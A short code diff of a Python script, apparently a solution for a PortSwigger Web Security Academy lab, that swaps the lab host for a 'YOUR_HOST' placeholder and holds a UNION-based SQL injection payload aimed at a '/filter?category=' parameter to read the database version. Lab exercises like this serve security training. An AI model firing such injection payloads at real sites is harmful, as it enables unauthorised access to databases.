@@ -1,6 +1,6 @@
 import requests
 pathname='/filter?category='
-host='0aac00b9032c4fde80755326006800bb.web-security-academy.net'
+host='YOUR_HOST'
 payload="' UNION SELECT null,version() -- -"
 
 headers={
